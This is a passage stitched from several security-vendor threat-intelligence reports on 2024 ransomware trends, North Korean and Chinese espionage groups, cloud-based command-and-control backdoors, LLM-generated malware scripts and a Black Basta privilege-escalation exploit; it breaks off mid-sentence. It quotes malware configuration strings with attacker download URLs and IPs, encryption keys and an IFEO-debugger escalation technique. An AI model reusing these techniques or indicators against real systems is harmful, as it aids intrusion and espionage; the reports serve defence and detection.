2024,the U.S. Justice Department indicted a North Korean man named Rim Jong Hyokon charges related to the attack campaign. Rim is alleged to be a member of the Stonefly group, which is linked to the North Korean military intelligence agency, the Reconnaissance General Bureau (RGB). He was charged with being involved in extorting U.S. hospitals and other healthcare providers between 2021 and 2023, laundering the ransom proceeds, and then using these proceeds to fund additional cyberattacks against targets in the defense, technology, and government sectors worldwide. Targets of these follow-on attacks included two U.S. Air Force bases, NASA-OIG, and organizations located in Taiwan, South Korea, and China. In addition to the indictment, the U.S. Department of Stateoffered a reward of up to $10 million for informationon his location or identification. Stonefly first came to notice in July 2009, when it mounted distributed denial-of-service (DDoS) attacks against a number of South Korean, U.S. government, and financial websites. It reappeared again in 2011, when it launched more DDoS attacks, but also revealed an espionage element to its attacks when it was found to be using a sophisticated backdoor Trojan (Backdoor.Prioxer) against selected targets. In March 2013, the group was linked to the Jokra (Tojan.Jokra) disk-wiping attacks against a number of South Korean banks and broadcasters. Three months later, the group was involved in a string ofDDoS attacks against South Korean government websites. In recent years, the group’s capabilities have grown markedly and, since at least 2019, Symantec has seen its focus shift mainly to espionage operations against select, high-value targets. It appears to specialize in targeting organizations that hold classified or highly sensitive information or intellectual property. While other North Korean groups are well known for mounting financial attacks driven by the need to raise foreign currency for the regime, Stonefly had until recent years appeared not to be involved in financially motivated attacks. While Stonefly’s move into financially motivated attacks is a relatively recent development, the spotlight shone on the group’s activities due to the indictment naming one of its members has not yet led to a cessation of activity. The group is likely continuing to attempt to mount extortion attacks against organizations in the U.S. For the latest protection updates, please visit theSymantec Protection Bulletin. thumbprint = \"313cffaac3d1576ca3c1cee8f9a68a15a24ff418\"issuer = \"/CN=Baramundi Inc.\"subject = \"/CN=Baramundi Inc.\"version = 3algorithm = \"sha1WithRSA\"algorithm_oid = \"1.3.14.3.2.29\"serial = \"af:6d:f9:f9:69:86:58:80:49:1e:2b:ae:20:9f:0d:12\"not_before = 1683852503not_after = 2208988799verified = 1digest_alg = \"sha1\"digest = \"efe03d9be2cd148594e5fcb7272a40b85e33d2bf\"file_digest = \"efe03d9be2cd148594e5fcb7272a40b85e33d2bf\"number_of_certificates = 1 thumbprint = \"10b8b939400a59d2cb79fff735796d484394f8dd\"issuer = \"/CN=VEXIS SOFTWARE LTD.\"subject = \"/CN=VEXIS SOFTWARE LTD.\"version = 3algorithm = \"sha1WithRSA\"algorithm_oid = \"1.3.14.3.2.29\"serial = \"bc:bf:05:4e:a8:b2:69:be:4c:c9:04:f0:8d:f9:eb:97\"not_before = 1710348691not_after = 2208988799verified = 1digest_alg = \"sha1\"digest = \"b9b5d20438cf54acf33ee5731dc283554b8a044c\"file_digest = \"b9b5d20438cf54acf33ee5731dc283554b8a044c\"number_of_certificates = 1 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "content": "Ransomware activity increased markedly in the second quarter of 2024 as attackers seemingly recovered their momentum following the disruption experienced in late 2023 and early 2024. Analysis of data from ransomware leak sites found that ransomware actors claimed 1,310 attacks in the second quarter of 2024, a 36% increase on the first quarter of this year. This was the second highest amount of attacks claimed in a quarter by ransomware operators, short of the record 1,488 attacks claimed in the third quarter of 2023. Powering this increase in attacks has been the complete recovery of LockBit from disruption experienced following aninternational law enforcement operationin February 2024. LockBit, which is operated by the Syrphid cybercrime group, has long been the most prolific ransomware operation but experienced a dip in activity in the first quarter of this year. However, LockBit attacks increased significantly in the second quarter of 2024 and, with 353 attacks claimed this quarter, are now higher than ever. Another factor driving the overall increase in attacks has been the emergence of a number of operators to occupy the space once controlled by the now-departed Noberus ransomware operation. Noberus, along with LockBit, was among the dominant players before it closed down in March 2024, citing the impact of a law enforcement operation along with reports of a falling out with many of its affiliates. Chief among these successors has been Qilin (aka Agenda), which first emerged in late 2022 and is reportedly run as a ransomware-as-service (RaaS) operation.Attacks claimed by Qilin increased by 47% to 97 in the second quarter of 2024.Play, which has reportedly opened an RaaS operation, saw its attacks increase by 27% to 89 in the second quarter. Perhaps the most significant uptick in claimed attacks involved RansomHub,which first appeared in only February 2024 but appears to have been quick in winning over affiliates to its RaaS operation. Attacks claimed by RansomHub more than tripled in the second quarter to 75, up from 23 in the first quarter of this year. RansomHub’s surge in activity has pushed it into the center of the ransomware ecosystem and it was the fourth most prolific ransomware family in the second quarter. Yet again, there were marked differences between overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit in both cases counted for the largest proportion of attacks, it claimed 27% of all publicly reported attacks and was responsible for 19% of all attacks investigated by Symantec. Conversely, Play was behind 19% of all attacks investigated by Symantec, but only accounted for 7% of all publicly claimed attacks. The comparison may give some indication of success rates experienced by actors linked to each operation. For Symantec to positively identify an attack as associated with a certain ransomware family, the attack has to advance to the stage where the attackers attempt to deploy a payload. This suggests that attackers using Play are more likely to advance their attacks at least to the payload deployment stage. Although the vector may not be discovered for every ransomware attack, the available evidence suggests that attackers are continuing to favor the exploitation of known vulnerabilities in public-facing applications as a means of access. For example, in July 2024, Symantec found that threat actors linked to the Snakefly cybercrime group were actively scanning for CrushFTP servers vulnerable toCVE-2024-4040to run remote commands to download malware onto compromised machines. While CVE-2024-4040 was patched on April 19, 2024, Snakefly was continuing to search for and exploit unpatched systems. Snakefly is a specialist in these kinds of attacks and has along track record of exploiting recently patched and zero-day vulnerabilitiesin order to mount extortion campaigns. Snakefly is responsible for the Cl0p ransomware and it appeared to be highly likely that the final objective of this campaign was the deployment of Cl0p ransomware. Along with exploitation of known vulnerabilities there is anecdotal evidence of attackers targeting exposed RDP servers with weak credentials and poor network segmentation to facilitate lateral movement. In many cases, the absence of multi-factor authentication (MFA) across these services means that weak credentials are particularly vulnerable to exploitation. The sharp increase in attacks in the second quarter of this year suggests that momentum is once again with attackers. While high-profile ransomware operations such as Noberus shut down, the pool of skilled affiliates appears to be undisturbed and many appear to simply migrate to alternative franchises.

    "content": "A previously unseen backdoor (Backdoor.Msupedge) utilizing an infrequently seen technique was deployed in an attack against a university in Taiwan. The most notable feature of this backdoor is that it communicates with a command-and-control (C&C) server via DNS traffic. While the technique is known and has beenused by multiple threat actors, it is nevertheless something that is not often seen. Msupedge is a backdoor in the form of a dynamic link library (DLL). It has been found installed in the following file paths: While wuplog.dll is loaded by Apache (httpd.exe), the parent process for wmiclnt.dll is unknown. Msupedge uses DNS tunneling for communication with the C&C server. The code for the DNS tunneling tool is based onthe publicly available dnscat2tool. It receives commands by performing name resolution. The host names that are resolved are structured as follows: Error notifications include the success or failure of the following: The backdoor also appears to encode the result of the command execution as a fifth-level domain and send it. Msupedge not only receives commands via DNS traffic but also uses the resolved IP address of the C&C server (ctl.msedeapi[.]net) as a command. The third octet of the resolved IP address is a switch case. The behavior of the backdoor will change based on the value of the third octet of the resolved IP address minus seven. For example, if the third octet is 145, this translates to 138 (expressed in hexadecimal as 0x8a) Msupedge supports the following commands: The initial intrusion was likely through the exploit of a recently patched PHP vulnerability (CVE-2024-4577). The vulnerability is a CGI argument injection flaw affecting all versions of PHP installed on the Windows operating system. Successful exploitation of the vulnerability can lead to remote code execution. Symantec has seen multiple threat actors scanning for vulnerable systems in recent weeks. To date, we have found no evidence allowing us to attribute this threat and the motive behind the attack remains unknown.

    "title": "cloud espionage attacks",
    "link": "https://www.security.com/threat-intelligence/cloud-espionage-attacks",
    "content": "The number of threat actors leveraging legitimate cloud services in their attacks has grown this year as attackers have begun to realize their potential to provide low-key and low-cost infrastructure. Traffic to and from well known, trusted services such as Microsoft OneDrive or Google Drive may be less likely to raise red flags than communications with attacker-controlled infrastructure. In the past few weeks alone, Symantec’s Threat Hunter Team has identified three further espionage operations using cloud services and found evidence of further tools in development. Marc Elias, an investigator with the Threat Hunter Team,will be presenting these findings today (August 7) at the Black Hat Conference in Las Vegas. A previously unseen backdoor which Symantec has named GoGra (Trojan.Gogra) was deployed against a media organization in South Asia in November, 2023. GoGra is written in Go and uses the Microsoft Graph API to interact with a command-and-control (C&C) server hosted on Microsoft mail services. Graph is a Microsoft API designed to facilitate access to resources hosted on Microsoft cloud services, such as Microsoft 365. Authentication is carried out using OAuth access tokens. GoGra is configured to read messages from an Outlook username \"FNU LNU\" whose subject line starts with the word \"Input\". It decrypts the message contents using the AES-256 algorithm in Cipher Block Chaining (CBC) mode, using the following key: b14ca5898a4e4133bbce2ea2315a1916. Gogra executes commands via the cmd.exe input stream and supports an additional command named \"cd\" which changes the active directory. After the execution of a command, it encrypts the output and sends it to the same user with the subject \"Output\". Analysis of the backdoor revealed that it is highly likely it was developed by Harvester, a nation-state-backed groupuncovered by Symantec in 2021that specializes in targeting organizations in South Asia. GoGra is functionally similar to a known Harvester tool called Graphon, which was written in .NET. Aside from the different programming languages used, Graphon used a different AES key (juBvYU7}33Xq}ghO), did not contain the extra “cd” command, and did not have a hardcoded Outlook username to communicate with. The username was instead received from the C&C server. A previously unseen exfiltration tool was deployed by the Firefly espionage group in an attack against a military organization in South East Asia. Analysis of the tool revealed that it was apublicly available Google Drive clientin a Python wrapper. The tool was configured to search for all .jpg files in the System32 directory and upload them to Google Drive using a hardcoded refresh token. Many of the exfiltrated files were not actual .jpg images but were instead encrypted RAR files, which were likely either created by hands-on-keyboard activity by the attackers or by another attacker-deployed tool that copied and prepared data for exfiltration. Exfiltrated data included documents, meeting notes, call transcripts, building plans, email folders, and accounting data. A previously unseen backdoor named Trojan.Grager was deployed against three organizations in Taiwan, Hong Kong, and Vietnam in April 2024. Analysis of the backdoor revealed that it used the Graph API to communicate with a C&C server hosted on Microsoft OneDrive. Grager was downloaded from a typosquatted URL mimicking the open-source file archiver 7-Zip (hxxp://7-zip.tw/a/7z2301-x64[.]msi). The aforementioned MSI file, which acts as a dropper, is a Trojanized 7-Zip installer that installs the real 7-Zip software into the folder “C:\\Program Files (x86)\\7-Zip” along with a malicious DLL named “epdevmgr.dll” (SHA2: ab6a684146cec59ec3a906d9e018b318fb6452586e8ec8b4e37160bcb4adc985), a copy of the Tonerjam malware, and the encrypted Grager backdoor into a file named “data.dat” (SHA2: 45a5dd715dc5f08f3b987a0415c2e500c549508aadf4183fdb94f749af8f1d67). The Tonerjam malwarewas described by Mandiantas a launcher that decrypts and executes a shellcode payload, which in this case was the new backdoor Grager. The backdoor decrypts a client_id and refresh token for OneDrive from a blob within the file’s body. The backdoor supports the following commands: There are tentative links between this tool and a group known as UNC5330. Symantec observed the Tonerjam malware described in this blog being dropped with the same file name (epdevmgr.dll) by a benign sample named (EpDevMgr.exe), which Mandiant also attributes to UNC5330. UNC5330 was described as a “suspected China-nexus espionage actor” that exploited Ivanti Connect Secure VPN vulnerabilities (CVE-2024-21893 and CVE-2024-21887) to compromise appliances in early 2024. Symantec also found evidence of another backdoor called MoonTag (Trojan.Moontag) that appears to be currently in development. Several variants of the backdoor have been uploaded to VirusTotal in recent weeks, although none appeared complete. The malware, which may be named “Moon_Tag” by its developer given references in its strings, is based oncode published in this Google Group. All the variants found contain functionality for communicating with the Graph API. MoonTag samples match a YARA rule named “MAL_APT_9002_SabrePanda” that detects samples from the 9002 RAT malware family used by the Sabre Panda threat actor. We did not find strong links to attribute MoonTag to Sabre Panda, but we can attribute the MoonTag backdoor with high confidence to a Chinese-speaking threat actor based on the Chinese language used in the Google Group post and the infrastructure used by the attackers. Another backdoor (Trojan.Ondritols), which appears to be called Onedrivetools by its authors, has been deployed against IT services companies in the U.S. and Europe. A multi-stage backdoor, the first stage is a downloader that authenticates to Microsoft Graph API and downloads the second stage payload from OneDrive and executes it. The main payload will downloada publicly available filefrom GitHub. It will then create a folder in OneDrive named deviceId_n_<ip address> for each infected machine and upload the following file to OneDrive to signal the attackers the status of a new infection: /v1.0/me/drive/root:/deviceId_n_<ip address>/status It will then continue in a loop, authenticating itself using Graph API, creating a file called heartbeat with the content “1” and fetching the new commands to execute from a file called cmd, both files located in the victim folder. The output of the executed command will be saved in the same cmd file. The backdoor also can download files to its victims and upload files from the infected machine to OneDrive. The attackers used a tunneling tool known as Whipweave (SHA256: 30093c2502fed7b2b74597d06b91f57772f2ae50ac420bcaa627038af33a6982), likely derived from the open-source Chinese VPN Free Connect (FCN) project, to connect to an Operational Relay Box (ORB) network known as Orbweaver which is designed to obfuscate the origin of attacks. In May 2024,Symantec uncovered BirdyClient, new malware that used the Graph API to communicate with a OneDrive C&C server. The malware was used in an attack against an organization in Ukraine. Although leveraging cloud services for command and control is not a new technique, more and more attackers have started to use it recently. Three years ago, Volexity published aboutBlueLight, malware developed by the North Korea-linked Vedalia espionage group (aka APT37). This was followed by Symantec’s discovery of the Graphon backdoor in October 2021. The Russian Swallowtail espionage group (aka APT28, Fancy Bear) was found to have adopted the tactic followingthe discovery of Graphite—malware that used the Graph API to communicate with a OneDrive account that was acting as a C&C server. In June 2023,Symantec discovered Backdoor.Graphican, which was being used by the Flea (aka APT15, Nickel) group in a campaign against foreign affairs ministries in the Americas. The number of actors now deploying threats that leverage cloud services suggests that espionage actors are clearly studying threats created by other groups and mimicking what they perceive to be successful techniques.

    "title": "malware ai llm",
    "link": "https://www.security.com/threat-intelligence/malware-ai-llm",
    "content": "Symantec has observed an increase in attacks that appear to leverage Large Language Models (LLMs) to generate malicious code used to download various payloads. LLMs are a form of generative AI designed to understand and generate human-like text. They have a wide range of applications, from assisting in writing to automating customer service. However, like many powerful technologies, LLMs can also be abused. Recent malware campaigns observed by Symantec involved phishing emails containing code used to download various payloads, including Rhadamanthys, NetSupport, CleanUpLoader (Broomstick, Oyster), ModiLoader (DBatLoader), LokiBot, and Dunihi (H-Worm). Analysis of the scripts used to deliver malware in these attacks suggests they were generated using LLMs. The following example details a campaign targeting a wide range of sectors. The attacks involve phishing emails with attached .zip archives containing malicious .lnk files, which, once executed, trigger LLM-generated PowerShell scripts that lead to the deployment of malware. The emails purport to relate to an urgent financing issue and contain a password-protected ZIP file, the password for which is also included in the email. The ZIP file contains an LNK file that, when executed, runs a PowerShell script (Figure 2) likely generated using an LLM. Functions and variables are nicely formatted with leading single-line comments that use highly accurate grammar to explain their usage. The script can easily be produced automatically using an LLM. We were able to produce similar results during our research using ChatGPT and a series of simple prompts (Figure 3). Final payloads deployed in this campaign included the Rhadamanthys information-stealing malware and the CleanUpLoader backdoor (aka Broomstick, Oyster). The following example details the use of LLM-generated code to facilitate the phishing stage and the payload delivery stage of an attack. The following describes the attack chain events. 1. Initial access:User receives a human-crafted phishing email with an attachment, mimicking an HR notification. 2. Execution of LLM-generated script:Opening the malicious attachment executes an HTML file with embedded JavaScript that is highly likely generated by an LLM. This script is designed to download and execute additional payloads, although the webpage displayed in this case is fairly simple and the HTML behind it is small and quick to load. Analysis of the HTML file, which facilitates a crucial link of the attack chain, reveals the characteristic features of an LLM-generated file (Figure 6). The file itself can easily be produced automatically using an LLM, with little human effort required. 3. Final payload download:By the time the user sees the page shown in Figure 5, the next stage payload – a loader for the Dunihi (H-Worm) malware – would have already been downloaded if the user has not configured their browser to ask for download permission first. Symantec also observed campaigns delivering the ModiLoader (DBatLoader) malware loader, the LokiBot information-stealing Trojan, and NetSupport remote access Trojan. The use of LLMs to generate HTML code used in these campaigns is also suspected. The potential for AI to revolutionize our world is undeniable; however, it is also revolutionizing cybercrime. AI tools such as LLMs lower the barrier to entry for many threat actors, while increasing the level of sophistication for others. As we have shown, AI-powered tools have given threat actors not only the ability to quickly craft convincing and targeted phishing emails, but also to generate malicious code that would normally require considerable expertise, time, and resources. It is worth highlighting that AI is only going to get better. While the benefits for society are sure to be great, malicious actors will also benefit, using it to launch more sophisticated and effective attacks faster and at a larger scale. Symantec is at the forefront of cybersecurity, offering robust protection against the never-ending wave of new threats, including those recently observed, highly likely generated by LLMs. Our security solutions are equipped with advanced detection capabilities that block AI-based LLM-generated threats, with our threat hunting experts continuously monitoring the threat landscape, harvesting emerging threats, conducting detailed analysis, updating our automation models, and ensuring our customers are always protected.

    "title": "daggerfly espionage updated toolset",
    "link": "https://www.security.com/threat-intelligence/daggerfly-espionage-updated-toolset",
    "content": "The Daggerfly (aka Evasive Panda, Bronze Highland) espionage group has extensively updated its toolset, introducing several new versions of its malware, most likely in response to exposure of older variants. The new tooling was deployed in a number of recent attacks against organizations in Taiwan and a U.S. NGO based in China, which indicates the group also engages in internal espionage. In the attack on this organization, the attackers exploited a vulnerability in an Apache HTTP server to deliver their MgBot malware. Among the new additions to Daggerfly’s arsenal are a new malware family based on the group’s MgBot modular malware framework and a new version of the Macma macOS backdoor. While Macma is a previously documented threat, it had hitherto been of unknown authorship. However, Symantec’s Threat Hunter Team has now found evidence suggesting that it is developed by Daggerfly. Active for at least a decade, Daggerfly is primarily known for its development and use of the MgBot framework. In 2023,Symantec reported a Daggerfly intrusionagainst a telecoms operator in Africa involving previously unseen plugins for MgBot. Macma is a macOS backdoor that wasfirst documented by Google in 2021but appears to have been used since at least 2019. At the time of discovery, it was being distributed in watering hole attacks involving compromised websites in Hong Kong. The watering holes contained exploits for iOS and macOS devices. Users of macOS devices were targeted with a privilege escalation vulnerability (CVE-2021-30869) which allowed the attackers to install Macma on vulnerable systems. Macma is a modular backdoor. Functionality includes: Following its exposure, further details about the threat were published byObjective-SeeandSentinelOne. Recent variants of Macma found by Symantec exhibit evidence of ongoing development. One version (SHA256: 003764fd74bf13cff9bf1ddd870cbf593b23e2b584ba4465114023870ea6fbef) contained a different main module (SHA256: 1f5e4d2f71478518fe76b0efbb75609d3fb6cab06d1b021d6aa30db424f84a5e) to previously documented versions. The main difference lies in strings that appear to function as configuration data (see Figure 1). A second version of Macma (SHA256: dad13b0a9f5fde7bcdda3e5afa10e7d83af0ff39288b9f11a725850b1e6f6313) contained what appeared to be incremental updates to the existing functionality. Some of the identified updates included: Its main module (SHA256: fce66c26deff6a5b7320842bc5fa8fe12db991efe6e3edc9c63ffaa3cc5b8ced) exhibited evidence of more extensive modification. This included: In addition to this, it too had different strings containing configuration data (see Figure 1). Another module from this variant (SHA256: eff1c078895bbb76502f1bbad12be6aa23914a4d208859d848d5f087da8e35e0) contained modified code to adjust the size of a created screen capture, which apparently related to the aspect ratio when resizing the capture. Although Macma was widely believed to have been linked to advanced persistent threat (APT) activity, it has hitherto not been linked to a particular group. However, Symantec has found evidence to suggest that it is part of the Daggerfly toolkit. Two variants of the Macma backdoor connected to a command-and-control (C&C) server (103.243.212[.]98) that was also used by an MgBot dropper. In addition to this shared infrastructure, Macma and other known Daggerfly malware including Mgbot all contain code from a single, shared library or framework. Elements of this library have been used to build Windows, macOS, Linux, and Android threats. Functionality provided by this library includes: An example of this library code is seen when the magic string \"inp\" is sent over a SOCK_DGRAM socket: sendto(*(_DWORD *)(v2 + 56), \"inp\", 3, 0, (const struct sockaddr *)(v2 + 60), 16); While sendto() may be used to communicate with other hosts in general, here the communication is with a local machine (127.0.0), and could be even be threads in the same process. Another example involves the magic string \"tim\" being sent over a socket similar to the following: sendto(*(_DWORD *)(v1 + 56), \"tim\", 3, 0, (const struct sockaddr *)(v1 + 60), 16); Symantec has yet to find any matching code in public repositories. Shared code and shared infrastructure between Macma and other Daggerfly tools suggests that Macma is also part of the Daggerfly toolkit. A new addition to Daggerfly’s toolkit is a Windows backdoor (Trojan.Suzafk),which was first documented by ESET in March 2024as Nightdoor (aka NetMM) when it was observed being used alongside Mgbot. Suzafk was developed using the same shared library used in Mgbot, Macma, and a number of other Daggerfly tools. Suzafk is a multi-staged backdoor capable of using TCP or OneDrive for C&C. The malware contained the following configuration, indicating the functionality to connect to OneDrive is in development or present in other variants of the malware: ReadMe=ConnONEDRIVE;Version=256;Tag=15ad490f332f3d9a;DownloadUrl=http://103.96.131.150:19876/30_1410402971.exe;token={\"refresh_token\":\"REDACTED\",\"client_id\":\"4aa6708f-f3c8-4511-8118-5a7208be6a44\",\"client_secret\":\"REDACTED\"};DownloaderSavePath=C:\\Programdata\\Office\\;HttpServerFolder=C:\\Program Files\\Common Files\\Cloudata\\; Another configuration to use a TCP connection for C&C purposes is also present in the backdoor: ReadMe=ConnTCP;Version=256;Tag=15ad490f332f3d9a;DownloadUrl=http://103.96.131.150:19876/30_1292836936.exe;IP=103.96.131.150;Port=40020;DownloaderSavePath=C:\\\\Programdata\\\\Office\\\\;HttpServerFolder=C:\\\\Program Files\\\\Common Files\\\\Cloudata\\\\; The loader (SHA256: 5687b32cdd5c4d1b3e928ee0792f6ec43817883721f9b86ec8066c5ec2791595) drops two files: Engine.dll and MeitUD.exe. MeituUD.exe is a legitimate application named DAEMON Tools Lite Helper. Engine.dll is a loader DLL that sets persistence via scheduled tasks and loads the final payload in memory. The backdoor has embedded code from the al-khaser project, a public code repository aimed to detect virtual machines, sandboxes, and malware analysis environments. It also creates the folders C:\\ProgramData\\Office\\EFir and C:\\ProgramData\\Office\\Temps and stores additional network configuration data under the C:\\ProgramData\\Office\\sysmgr file XOR encrypted with the key 0x7A. The network configuration in plaintext has the following parameters and values: LOCAL_MAC_ADDR=[mac address] [ManageTermKeyStatus] [ManageTermServerInfoOffset] [ManageTermUseCreateCloudDirAlgorithm] Next, the malware creates a cmd.exe shell to send and receive commands from the C&C server (103.96.131[.]150) via open pipes. Additionally, the following commands can be executed: ipconfigsysteminfotasklistnetstat New findings provide a clearer picture of the capabilities and resources behind Daggerfly. The group can create versions of its tools targeting most major operating system platforms. In addition to the tools documented here, Symantec has seen evidence of the ability to Trojanize Android APKs, SMS interception tools, DNS request interception tools, and even malware families targeting Solaris OS. Daggerfly appears to be capable of responding to exposure by quickly updating its toolset to continue its espionage activities with minimal disruption.

    "title": "ransomware q2 2024",
    "link": "https://www.security.com/threat-intelligence/ransomware-q2-2024",
    "content": "Ransomware activity fell slightly during the first quarter of 2024, most likely as a result of disruption to two major ransomware groups. However, overall activity levels remain on an upward trend and the number of attacks claimed in the first quarter of 2024 was ahead of attacks claimed in the corresponding quarter of 2023. Analysis of data from ransomware leak sites found that ransomware actors claimed 962 attacks in the first quarter of 2024. The figure was down from the 1,190 attacks claimed in the fourth quarter of 2023, but still above the 886 attacks claimed in the first quarter of 2023. The drop in overall activity levels is likely linked to disruption experienced by LockBit and Noberus, which were the two most prolific ransomware operations in 2023. Noberus (aka ALPHV, BlackCat)was the target of a U.S.-led law enforcement operationin December 2023. Although Noberus attempted to reestablish itself in the following weeks, it eventually closed in March 2024, citing the impact of the law enforcement operation, amid reports of a falling out with many of its affiliates. LockBit meanwhile was thetarget of a second international law enforcement operationin February 2024, but it has continued to operate. LockBit’s position as the number one ransomware threat remained unchallenged in the first quarter of 2024, accounting for over 20% of all claimed attacks. It was followed by Play, which was recently reported as having started a ransomware-as-a-service (7%), the prolific Phobos affiliate 8Base (6%), and the emergent Qilin ransomware (6%). Once again, there were some big disparities between overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit in both cases counted for the largest proportion of attacks, Akira was the second most prevalent ransomware family in attacks investigated by Symantec in Q1 (14%), yet it only accounted for 5.5% of all claimed attacks. Similarly, Blacksuit was involved in 11% of attacks investigated by Symantec, but only claimed 1.6% of all publicly reported attacks. The comparison may give some indication of success rates experienced by actors linked to each operation. For Symantec to positively identify an attack as associated with a certain ransomware family, the attack has to advance to the stage where the attackers attempt to deploy a payload. This suggests that attackers using Akira and Blacksuit are more likely to advance their attacks at least to the payload deployment stage. Available evidence suggests that exploitation of known vulnerabilities in public-facing applications continues to be the main vector for ransomware attacks. Attackers are continuing to target recently patched vulnerabilities in a bid to find unpatched systems. For example, in recent weeks, Symantec uncovered an ongoing campaign where attackers targeted web servers by exploiting a recently disclosed PHP vulnerability. The vulnerability (CVE-2024-4577) is a CGI argument injection flaw affecting all versions of PHP installed on the Windows operating system. The issue also affects all versions of the XAMPP development environment installed on Windows. Successful exploitation of the vulnerability can lead to remote code execution. Once the attackers gain access to a vulnerable server, they download several tools, including a malicious HTA file that contains a copy of the open-source privilege-escalation tool BadPotato; a custom web shell; and a loader previously observed being used to deploy TellYouThePass ransomware. One notable development in Q1 was the return of the Clop (aka Cl0p) ransomware. Clop is operated by the Snakefly cybercrime group and fell into disuse during 2023 as the group began to forego encryption and focus purely on data theft for extortion. The threat actors achieve this chiefly by exploiting zero-day vulnerabilities in software that allow them to hit multiple victims at once, stealing their data before the activity is discovered, and threatening to publish it if a ransom isn’t paid. The most high-profile attack Snakefly was involved in in 2023 was theexploitation of vulnerabilities in Progress Software’s MOVEit Transfer managed file-transfer application. However, in recent weeks Symantec’s Threat Hunter Team has seen the Clop payload being used once again, suggesting that Snakefly is returning to mounting conventional double extortion attacks. Bring-Your-Own-Vulnerable-Driver (BYOVD) continues to be a favored tactic among ransomware groups, particularly as a means of disabling security solutions. Since drivers are signed and can obtain kernel access, they are frequently used to kill processes. A correctly written driver will contain checks to ensure that only the software it’s designed to work with is issuing commands and that it’s only used for its intended purpose.  A vulnerable driver, in the wrong hands, becomes a de facto privilege escalation tool. The most recently seen tool in this category is Warp AV Killer, which has been used by at least one LockBit affiliate in recent weeks and leverages a vulnerable Avira anti-rootkit driver to disable security products. Although ransomware operations have experienced a high level of disruption to date in 2024, the impact on activity levels has been relatively limited. Ransomware is likely to continue as one of the main threats faced by enterprises for the foreseeable future. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "content": "Attackers using tools associated with Chinese espionage groups have breached multiple telecom operators in a single Asian country in a long-running espionage campaign. The attackers placed backdoors on the networks of targeted companies and also attempted to steal credentials. The attacks have been underway since at least 2021, with evidence to suggest that some of this activity may even date as far back as 2020. Virtually all of the organizations targeted were telecoms operators, with the addition of a services company that serves the telecoms sector and a university in another Asian country. Custom malware associated with a number of China-linked espionage actors was used in the campaign, including: Coolclient:A backdoor associated with the Fireant group (aka Mustang Panda, Earth Preta). Its functionality includes logging keystrokes, reading and deleting files, and communication with a command and control (C&C) server. Variants of the backdoor used in this campaign were similar to onedocumented by Trend in 2023. A version of the legitimate VLC Media Player masquerading as a Google file (googleupdate.exe) was used to sideload a Coolclient loader (file name: libvlc.dll). The loader reads an encrypted payload from a file named loader.ja. This payload will in turn read a second encrypted payload from a file named goopdate.ja and inject it into the winver.exe process. Quickheal:A backdoor that has been long associated with the Neeedleminer group (aka RedFoxtrot, Nomad Panda). The variant of Quickheal used in this campaign was a 32-bit DLL named RasTls.dll, which had an export named GetOfficeDatatal. Analysis of the malware revealed that it was almost identical to Quickheal variantsdocumented by Recorded Future in 2021, the only differences being new configuration details in the compiled code and VMProtect obfuscations. The backdoor communicated with a hardcoded C&C server named swiftandfast.net using TCP port 443. It used a custom communications protocol that was designed to look like SSL traffic but used its own encryption instead. Rainyday:A backdoor associated with the Firefly group (aka Naikon). Most of the Rainyday variants used during the campaign were executed using a loader named fspmapi.dll. The loader is sideloaded using a legitimate F-Secure executable named fsstm.exe. When loaded, it obtains the disk folder of the executable that started the process and sets it as the current directory. It then obtains the memory location of the executable and patches its memory image. This appears to be done in order to hijack the execution flow when the malware is loaded by a certain executable. If the hijack is successful, the loader reads from a file called dataresz, decrypts the payload with a single byte XOR key (0x2D) and executes it as shellcode. Minor variants of the above include one with an invalid digital signature by \"Kaspersky Lab\" and another whose loader reads the encrypted shellcode from a file named iReports. Another variant is executed using a loader named security.dll. It is sideloaded using an executable called msproxy.exe,which is an application called Proxifier, developed by Initex. The executable’s default name is ProxyChecker.exe and was likely renamed to masquerade as a Microsoft file. In this case, the loader reads the encrypted shellcode from a file named nod193100. The XOR key used is also different: 0xF6. Two files with the name nod193100 found on VirusTotal were, on analysis, found to be similar to a loader used for the Rainyday backdoordocumented by Bitdefender in 2021. Aside from the custom backdoors mentioned above, the attackers used a variety of other tactics, techniques, and procedures (TTPs): Tools used in this campaign have strong associations with multiple Chinese groups and at least three of the custom backdoors deployed are believed to be used exclusively by Chinese espionage actors. Coolclient is tied to the Fireant group while Quickheal is associated with the Needleminer group. Rainyday, meanwhile, has always been used by the Firefly group. All three groups are widely considered by multiple security firms, including Symantec, to be operating from China. The United States–China Economic and Security Review Commission, an independent advisory body established by the U.S. Congress,has described Fireflyas an \"APT possibly associated with Unit 78020 (PLA) that operates in the southern theater command’s area of responsibility (AOR).\" The nature of the link between the actors involved in the current campaign remains unclear. Possibilities include, but are not limited to: The ultimate motive of the intrusion campaign remains unclear. The attackers may have been gathering intelligence on the telecoms sector in that country. Eavesdropping is another possibility. Alternatively, the attackers may have been attempting to build a disruptive capability against critical infrastructure in that country.

    "link": "https://www.security.com/threat-intelligence/black-basta-ransomware-zero-day",
    "content": "The Cardinal cybercrime group (aka Storm-1811, UNC4393), which operates the Black Basta ransomware, may have been exploiting a recently patched Windows privilege escalation vulnerability as a zero-day. The vulnerability (CVE-2024-26169) occurs in the Windows Error Reporting Service. If exploited on affected systems, it can permit an attacker to elevate their privileges. The vulnerability was patched on March 12, 2024, and, at the time, Microsoft said there was no evidence of its exploitation in the wild. However, analysis of an exploit tool deployed in recent attacks revealed evidence that it could have been compiled prior to patching, meaning at least one group may have been exploiting the vulnerability as a zero-day. The exploit tool was deployed in a recent attempted ransomware attack investigated by Symantec’s Threat Hunter Team. Although the attackers did not succeed in deploying a ransomware payload in this attack, the tactics, techniques, and procedures (TTPs) used were highly similar to those described in arecent Microsoft report detailing Black Basta activity. These included the use of batch scripts masquerading as software updates. Although no payload was deployed, the similarities in TTPs makes it highly likely it was a failed Black Basta attack. Analysis of the exploit tool revealed that it takes advantage of the fact that the Windows file werkernel.sys uses a null security descriptor when creating registry keys. Because the parent key has a “Creator Owner” access control entry (ACE) for subkeys, all subkeys will be owned by users of the current process. The exploit takes advantage of this to create a \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe\" registry key where it sets the \"Debugger\" value as its own executable pathname. This allows the exploit to start a shell with administrative privileges. The variant of the tool used in this attack (SHA256: 